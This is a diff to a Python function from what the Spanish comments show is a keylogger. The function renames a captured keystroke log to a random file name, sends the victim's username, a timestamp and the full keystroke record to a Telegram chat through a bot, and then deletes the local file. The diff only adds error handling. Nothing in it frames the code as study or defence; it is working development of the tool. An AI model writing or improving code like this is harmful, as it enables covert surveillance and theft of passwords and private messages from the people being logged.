@@ -396,40 +396,37 @@ def SendLog():
 def TelegramBot():
     def random_char(y=5):
            return ''.join(random.choice(string.ascii_letters) for x in range(y))
+    try:
+        pathO = logKeyPath()+ LogName()
+        pathN = logKeyPath()+ random_char(15)+".txt"
+        os.rename(pathO, pathN)
+        # Abre el archivo
+        f = open (pathN ,'r')
+        #data = f.read()
+        #f.close()
+        #print(data)
+        # Tiempo
+        T = datetime.datetime.now()
 
-    pathO = logKeyPath()+ LogName()
-    pathN = logKeyPath()+ random_char(15)+".txt"
-    os.rename(pathO, pathN)
-    # Abre el archivo
-    f = open (pathN ,'r')
-    #data = f.read()
-    #f.close()
-    #print(data)
-    # Tiempo
-    T = datetime.datetime.now()
+        currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
 
-    #try:
-    currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-        
-        #sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
-    #try:
-    bot = telebot.TeleBot(Token())      # Instancia
-    bot.send_message(ID(),"Usuario: "+str(getuser())
-    bot.send_message(ID(),"Usuario: \nFecha: "+currentTime+"\nRegistro de teclas:")  
-    bot.send_message(ID(),f.read())   #
-            
-    #cursor.execute(sql,(str(getuser()),currentTime,data)) # Ejecuta virtual
-    f.close()
-    #os.remove(pathN)
-    #except:
-    #print("[Telegram] Error al subir los datos")
-    #except:
-    #    try:
-    #        pass
-    #        #os.remove(pathN)  # Borra la carpeta por posible Errores
-    #    except:
-    #        pass
-    #    print("[Telegram] No se encuentra el archivo")
+        try:
+            bot = telebot.TeleBot(Token())      # Instancia
+            bot.send_message(ID(),"Usuario: "+str(getuser()))
+            bot.send_message(ID(),"Usuario: \nFecha: "+currentTime+"\nRegistro de teclas:")  
+            bot.send_message(ID(),f.read())   #
+            f.close()
+            os.remove(pathN)
+        except:
+            print("[Telegram] Error al subir los datos")
+    except:
+        try:
+            pass
+            f.close()
+            os.remove(pathN)  # Borra la carpeta por posible Errores
+        except:
+            pass
+        print("[Telegram] No se encuentra el archivo")
 
 
 
